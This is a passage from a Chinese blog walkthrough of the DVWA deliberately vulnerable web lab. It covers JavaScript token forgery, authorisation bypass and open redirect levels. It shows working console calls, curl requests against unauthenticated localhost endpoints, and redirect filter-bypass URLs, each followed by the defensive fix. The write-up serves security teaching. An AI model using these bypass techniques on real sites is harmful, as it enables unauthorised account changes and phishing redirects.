+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=alert&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Impossible：硬编码函数名"><a href="#Impossible：硬编码函数名" class="headerlink" title="Impossible：硬编码函数名"></a>Impossible：硬编码函数名</h3><p>这一等级仍然使用 JSONP，但是不读取 callback 的值，而是将 solveSum 这一函数名硬编码进 <code>jsonp.php</code>。这才是使用 JSONP 的正确方式。</p>
+<h2 id="JavaScript-Attacks"><a href="#JavaScript-Attacks" class="headerlink" title="JavaScript Attacks"></a>JavaScript Attacks</h2><p>这一关提供了一个表单，我们可以提交一个 phase，同时前端计算了 <code>ChangeMe</code> 这个 phase 的哈希，后端验证哈希是否匹配。</p>
+<p>**攻击者的目标是：**成功提交 <code>success</code> 这个单词，并通过哈希验证。</p>
+<h3 id="Low：内联脚本"><a href="#Low：内联脚本" class="headerlink" title="Low：内联脚本"></a>Low：内联脚本</h3><p>如果直接提交 <code>success</code> 会提示 Invalid token。显然，表单里有个隐藏的 token。</p>
+<p>‍查看 HTML，能找到表单后的一段 script：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">rot13</span>(<span class="params">inp</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> inp.<span class="title function_">replace</span>(<span class="regexp">/[a-zA-Z]/g</span>,<span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((c&lt;=<span class="string">&quot;Z&quot;</span>?<span class="number">90</span>:<span class="number">122</span>)&gt;=(c=c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)+<span class="number">13</span>)?<span class="attr">c</span>:c-<span class="number">26</span>);&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generate_token</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> phrase = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">md5</span>(<span class="title function_">rot13</span>(phrase));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">generate_token</span>();</span><br></pre></td></tr></table></figure>
+
+<p>当页面打开时，该脚本将输入框中的内容通过某种方式算出 MD5 作为 token。可以猜到，后端肯定是检查了 token 和 phase 是否匹配。然而当页面刚加载时 phase 是 <code>ChangeMe</code>，除非直接提交 <code>ChangeMe</code>，其他任何 phase 都会显示 Invalid token。</p>
+<p>既然前端代码都能看见了，对 <code>success</code> 这个 phase 也用这种方式计算出其 MD5 就行了。其实，只要输入 <code>success</code>，然后在 console 里调用 <code>generate_token()</code>，就会计算出对应的 token，提交即可。</p>
+<h3 id="Medium：外部脚本，简单混淆"><a href="#Medium：外部脚本，简单混淆" class="headerlink" title="Medium：外部脚本，简单混淆"></a>Medium：外部脚本，简单混淆</h3><p>和 low 的区别在于：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">do_something</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--)</span><br><span class="line">        t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">do_elsesomething</span>(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">do_elsesomething</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;token&quot;</span>).<span class="property">value</span> = <span class="title function_">do_something</span>(e + <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span> + <span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好在混淆后的代码也并不难懂，页面加载后延时 300ms 调用 <code>do_elsesomething</code> 函数计算 token。我们仍然只要输入 <code>success</code> 后在 console 里调用 <code>do_elsesomething(&quot;XX&quot;)</code> 再提交即可。</p>
+<h3 id="High：高级混淆"><a href="#High：高级混淆" class="headerlink" title="High：高级混淆"></a>High：高级混淆</h3><p>和 medium 相比，这次代码做了充分的混淆，使代码几乎不可读。仔细观察，这段代码里用了 <code>eval</code> 函数。代码<strong>先构造出要执行的 JavaScript 代码</strong>，然后使用 <code>eval</code> 执行。</p>
+<p>既然构造出的代码要被执行，那能不能被我们看到呢？答案是肯定的。</p>
+<p>在 F12 里选中 Submit 按钮，可以看到其 click 事件绑定了一个函数，这个函数来源于 VM8084:1：</p>
+<p><img src="/2025/09/23/DVWA%E9%9D%B6%E5%9C%BA/4124032546.png" alt="F12 console 里看到的事件绑定" title="F12 console 里看到的事件绑定"></p>
+<p>这个 VM 指的是 V8 引擎为<strong>没有对应来源的 JavaScript</strong> 创造的虚拟机环境。对于有对应来源的脚本，这个地方本来会显示源文件地址。</p>
+<p>进入这个 VM8084:1，就能看到脚本构造出的可读 JavaScript 代码。看来，之前的代码混淆相当于没有作用了。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).<span class="property">value</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;send&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>
+
+<p>显然，代码按照顺序调用了三个 <code>token_part</code> 函数。我们也仿照这个流程进行即可。</p>
+<p>将输入框中内容改为 <code>success</code>，然后在 console 中调用：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">token_part_1</span>(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br><span class="line"><span class="title function_">token_part_2</span>(<span class="string">&quot;XX&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后点击 Submit（绑定的 Event Listener 会调用 <code>token_part_3</code>），就能完成提交。</p>
+<h3 id="Impossible：不要相信前端发来的任何数据"><a href="#Impossible：不要相信前端发来的任何数据" class="headerlink" title="Impossible：不要相信前端发来的任何数据"></a>Impossible：不要相信前端发来的任何数据</h3><blockquote>
+<p>You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</p>
+</blockquote>
+<p>永远不要相信前端发来的任何数据，不管在前端用了怎样的 JavaScript 处理。对于这个问题，没有 impossible 的解决方案。</p>
+<h2 id="Authorisation-Bypass"><a href="#Authorisation-Bypass" class="headerlink" title="Authorisation Bypass"></a>Authorisation Bypass</h2><p>在这关里，提供了一个用户管理列表，但是只有管理员用户 admin 可以访问。</p>
+<p>**攻击者的目标是：**作为非管理员用户，实现用户管理的功能。</p>
+<p>完成这关时，必须以非管理员用户登录 DVWA，例如名为 gordonb（密码 abc123）的用户。</p>
+<h3 id="Low：无防护-6"><a href="#Low：无防护-6" class="headerlink" title="Low：无防护"></a>Low：无防护</h3><p>通过 gordonb 用户登录，会发现左侧 Authorisation Bypass 这一关消失了。</p>
+<p>然而，不难发现每一关对应一个子路径。依然可以通过这个 URL 进入用户管理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/authbypass/</span><br></pre></td></tr></table></figure>
+
+<p>没有做任何的鉴权，只要进入页面就有修改编辑用户的权限。</p>
+<h3 id="Medium：UI-不让进，接口还能用"><a href="#Medium：UI-不让进，接口还能用" class="headerlink" title="Medium：UI 不让进，接口还能用"></a>Medium：UI 不让进，接口还能用</h3><p>通过 low 的方式，可以发现进不去这一关了，提示「Unauthorised」。</p>
+<p>然而，我们还是可以先研究研究这关的源码，在这个地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/view_source.php?id=authbypass&amp;security=medium</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Only the admin user is allowed to access this page.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Have a look at these two files for possible vulnerabilities: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* vulnerabilities/authbypass/get_user_data.php</span></span><br><span class="line"><span class="comment">* vulnerabilities/authbypass/change_user_details.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">dvwaCurrentUser</span>() != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Unauthorised&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看起来这个页面是进不去了。根据提示，可以发现通过 <code>get_user_data.php</code> 文件还是可以获取用户信息，访问下面这个 URL 能获取所有用户信息的 JSON：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/authbypass/get_user_data.php</span><br></pre></td></tr></table></figure>
+
+<p>也就是说没有做接口的鉴权，只做了 UI 的鉴权。</p>
+<p>同样地，可以通过 <code>change_user_details.php</code> 更新用户信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://localhost/vulnerabilities/authbypass/change_user_details.php&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; security=medium; PHPSESSID=0fd302cffc8f3d6e7cc65f176c4f556c&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Origin: http://localhost&#x27;</span> \</span><br><span class="line">  --data-raw <span class="string">&#x27;&#123;&quot;id&quot;:2,&quot;first_name&quot;:&quot;Gordon&quot;,&quot;surname&quot;:&quot;Brown1&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过这两个接口，虽然进不去管理员 UI，但是能获得相同的功能。</p>
+<h3 id="High：修改接口仍可用"><a href="#High：修改接口仍可用" class="headerlink" title="High：修改接口仍可用"></a>High：修改接口仍可用</h3><p>和 medium 相比，<code>get_user_data.php</code> 做了鉴权，但是 <code>change_user_details.php</code> 没有。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://localhost/vulnerabilities/authbypass/change_user_details.php&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; security=high; PHPSESSID=0fd302cffc8f3d6e7cc65f176c4f556c&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Origin: http://localhost&#x27;</span> \</span><br><span class="line">  --data-raw <span class="string">&#x27;&#123;&quot;id&quot;:2,&quot;first_name&quot;:&quot;Gordon&quot;,&quot;surname&quot;:&quot;Brown2&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个等级想要模拟的是愚蠢的开发者漏掉了这个接口的鉴权。</p>
+<h3 id="Impossible：全部鉴权"><a href="#Impossible：全部鉴权" class="headerlink" title="Impossible：全部鉴权"></a>Impossible：全部鉴权</h3><p>对 <code>change_user_details.php</code> 文件也加上鉴权。至此所有页面、接口都需要认证才能使用了。</p>
+<h2 id="Open-HTTP-Redirect"><a href="#Open-HTTP-Redirect" class="headerlink" title="Open HTTP Redirect"></a>Open HTTP Redirect</h2><p>这一关里，给出的 URL 中通过给指定页面的参数，让页面为我们重定向。该情境的本意是只能重定向到指定的两个页面。</p>
+<p>**攻击者的目标：**使之重定向到任何我们想要的页面。</p>
+<h3 id="Low：直接重定向"><a href="#Low：直接重定向" class="headerlink" title="Low：直接重定向"></a>Low：直接重定向</h3><p>无脑将 <code>redirect</code> 参数作为 <code>location.href</code> 的值。可以重定向到任何网站：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/open_redirect/source/low.php?redirect=https://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="Medium：不能含有协议名"><a href="#Medium：不能含有协议名" class="headerlink" title="Medium：不能含有协议名"></a>Medium：不能含有协议名</h3><p>判断目标 URL 中是否包含 <code>http://</code> 或者 <code>https://</code>，如果包含则拒绝重定向。</p>
+<p>表示 URL 时，如果没有明确指定协议，直接以 <code>//</code> 开头，则表示使用和当前页面相同的协议。现在绝大部分网站又都支持将 HTTP 重定向到 HTTPS。所以，只需要：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/open_redirect/source/medium.php?redirect=//www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="High：必须包含子串"><a href="#High：必须包含子串" class="headerlink" title="High：必须包含子串"></a>High：必须包含子串</h3><p>目标 URL 中必须包含 <code>info.php</code> 这个子串，否则拒绝重定向。</p>
+<p>这也很好绕过，最简洁的方式就是加一个没用的 param：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/vulnerabilities/open_redirect/source/high.php?redirect=https://www.baidu.com?a=info.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="Impossible：白名单-2"><a href="#Impossible：白名单-2" class="headerlink" title="Impossible：白名单"></a>Impossible：白名单</h3><p>最终，最安全的方式还是白名单。这一等级直接判断目标是 <code>info.php?id=1</code> 或者 <code>info.php?id=2</code>，其他一概拒绝。</p>
+<h2 id="总结：Web-安全的一些最佳实践"><a href="#总结：Web-安全的一些最佳实践" class="headerlink" title="总结：Web 安全的一些最佳实践"></a>总结：Web 安全的一些最佳实践</h2><p>根据以上漏洞的尝试和探索，可以得出这些 Web 安全的最佳实践：</p>
+<p>开发 Web 应用过程中可能有无数的坑，而踩到了安全方面的坑则特别可能带来极大的损失。最重要的是，在设计和开发的过程中要有充分的<strong>安全意识</strong>，避免各种形式的不良实践。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="wuyaxiao 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="wuyaxiao 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/09/23/xss-labs%E9%9D%B6%E5%9C%BA/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/09/23/Vulhub%E9%9D%B6%E5%9C%BA/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+            
+    
+  
+
+  <!-- 应使用 elif 而不是 else if -->  
+  <div class="comments" id="comments">  
+    
+  <script src="https://utteranc.es/client.js"
+    repo="wuyaxiao/wuyaxiao.github.io"
+    issue-term="title"
+    theme="github-light"
+    crossorigin="anonymous"
+    async>
+  </script>
+  
+  </div>  
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Brute-Force"><span class="nav-number">1.</span> <span class="nav-text">Brute Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E7%AE%80%E5%8D%95%E6%9A%B4%E5%8A%9B"><span class="nav-number">1.1.</span> <span class="nav-text">Low：简单暴力</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E7%AD%89%E5%BE%85%E6%97%B6%E9%97%B4"><span class="nav-number">1.2.</span> <span class="nav-text">Medium：等待时间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E9%9A%8F%E6%9C%BA%E7%AD%89%E5%BE%85%E6%97%B6%E9%97%B4-CSRF-%E9%98%B2%E6%8A%A4"><span class="nav-number">1.3.</span> <span class="nav-text">High：随机等待时间 &amp; CSRF 防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9A"><span class="nav-number">1.4.</span> <span class="nav-text">Impossible：账户锁定</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Command-Injection"><span class="nav-number">2.</span> <span class="nav-text">Command Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E4%B8%8D%E8%BF%87%E6%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">Low：不过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E7%AE%80%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="nav-number">2.2.</span> <span class="nav-text">Medium：简单过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E6%9B%B4%E5%A4%9A%E8%BF%87%E6%BB%A4"><span class="nav-number">2.3.</span> <span class="nav-text">High：更多过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">2.4.</span> <span class="nav-text">Impossible：白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cross-Site-Request-Forgery-CSRF"><span class="nav-number">3.</span> <span class="nav-text">Cross Site Request Forgery (CSRF)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E6%97%A0%E9%98%B2%E6%8A%A4"><span class="nav-number">3.1.</span> <span class="nav-text">Low：无防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E5%88%A4%E6%96%AD-referer"><span class="nav-number">3.2.</span> <span class="nav-text">Medium：判断 referer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9ACSRF-token"><span class="nav-number">3.3.</span> <span class="nav-text">High：CSRF token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E6%8F%90%E4%BE%9B%E5%8E%9F%E5%AF%86%E7%A0%81"><span class="nav-number">3.4.</span> <span class="nav-text">Impossible：提供原密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Inclusion"><span class="nav-number">4.</span> <span class="nav-text">File Inclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E6%97%A0%E9%98%B2%E6%8A%A4-1"><span class="nav-number">4.1.</span> <span class="nav-text">Low：无防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="nav-number">4.2.</span> <span class="nav-text">Medium：关键词过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E5%8F%AA%E8%83%BD%E6%98%AF%E6%96%87%E4%BB%B6"><span class="nav-number">4.3.</span> <span class="nav-text">High：只能是文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E7%99%BD%E5%90%8D%E5%8D%95-1"><span class="nav-number">4.4.</span> <span class="nav-text">Impossible：白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Upload"><span class="nav-number">5.</span> <span class="nav-text">File Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E6%97%A0%E9%98%B2%E6%8A%A4-2"><span class="nav-number">5.1.</span> <span class="nav-text">Low：无防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E9%99%90%E5%88%B6-MIME"><span class="nav-number">5.2.</span> <span class="nav-text">Medium：限制 MIME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E6%8B%93%E5%B1%95%E5%90%8D"><span class="nav-number">5.3.</span> <span class="nav-text">High：限制文件拓展名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E5%9B%BE%E7%89%87%E9%87%8D%E6%96%B0%E7%BC%96%E7%A0%81"><span class="nav-number">5.4.</span> <span class="nav-text">Impossible：图片重新编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insecure-CAPTCHA"><span class="nav-number">6.</span> <span class="nav-text">Insecure CAPTCHA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E6%B2%A1%E7%94%A8%E7%9A%84-step-%E9%AA%8C%E8%AF%81"><span class="nav-number">6.1.</span> <span class="nav-text">Low：没用的 step 验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E5%8F%88%E4%B8%80%E4%B8%AA%E6%B2%A1%E7%94%A8%E7%9A%84%E9%AA%8C%E8%AF%81"><span class="nav-number">6.2.</span> <span class="nav-text">Medium：又一个没用的验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E5%BC%80%E5%8F%91%E8%80%85%E7%95%99%E7%9A%84%E5%90%8E%E9%97%A8"><span class="nav-number">6.3.</span> <span class="nav-text">High：开发者留的后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E6%AD%A3%E5%B8%B8%E5%9C%B0%E4%BD%BF%E7%94%A8"><span class="nav-number">6.4.</span> <span class="nav-text">Impossible：正常地使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection"><span class="nav-number">7.</span> <span class="nav-text">SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E6%97%A0%E9%98%B2%E6%8A%A4-3"><span class="nav-number">7.1.</span> <span class="nav-text">Low：无防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89"><span class="nav-number">7.2.</span> <span class="nav-text">Medium：字符转义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E5%8D%95%E7%8B%AC%E7%9A%84%E9%A1%B5%E9%9D%A2"><span class="nav-number">7.3.</span> <span class="nav-text">High：单独的页面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E9%99%90%E5%88%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-%E9%A2%84%E7%BC%96%E8%AF%91"><span class="nav-number">7.4.</span> <span class="nav-text">Impossible：限制数据类型 &amp; 预编译</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-Blind"><span class="nav-number">8.</span> <span class="nav-text">SQL Injection (Blind)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weak-Session-IDs"><span class="nav-number">9.</span> <span class="nav-text">Weak Session IDs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Low%EF%BC%9A%E7%AE%80%E5%8D%95%E8%AE%A1%E6%95%B0%E5%99%A8"><span class="nav-number">9.1.</span> <span class="nav-text">Low：简单计数器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Medium%EF%BC%9A%E6%97%B6%E9%97%B4%E6%88%B3"><span class="nav-number">9.2.</span> <span class="nav-text">Medium：时间戳</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#High%EF%BC%9A%E8%AE%A1%E6%95%B0%E5%99%A8-MD5-%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6"><span class="nav-number">9.3.</span> <span class="nav-text">High：计数器 MD5 &amp; 访问限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Impossible%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8C%96-%E5%BC%BA%E9%99%90%E5%88%B6"><span class="nav-number">9.4.</span> <span class="nav-text">Impossible：随机化 &amp; 强限制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-Based-Cross-Site-Scripting-XSS"><span class="nav-number">10.</span> <span class="nav-text">DOM Based Cross Site 